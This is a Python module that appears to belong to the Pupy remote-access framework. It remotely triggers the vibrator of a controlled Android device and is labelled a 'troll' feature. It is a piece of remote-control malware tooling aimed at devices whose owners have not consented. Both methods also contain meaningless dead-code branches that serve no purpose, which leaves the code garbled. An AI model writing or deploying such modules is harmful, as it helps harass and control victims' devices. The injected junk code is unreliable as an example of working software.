from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
__class_name__ = 'AndroidVibrate'

@config(compat='android', cat='troll', tags=['vibrator'])
class AndroidVibrate(PupyModule):
    """ activate the phone/tablet vibrator :) """
    dependencies = ['pupydroid.vibrator']

    @classmethod
    def init_argparse(cls):
        if False:
            while True:
                i = 10
        cls.arg_parser = PupyArgumentParser(prog='vibrator', description=cls.__doc__)

    def run(self, args):
        if False:
            i = 10
            return i + 15
        pattern = [1000, 1000, 1000, 1000, 1000, 1000, 1000, 1000]
        self.client.conn.modules['pupydroid.vibrator'].vibrate(pattern)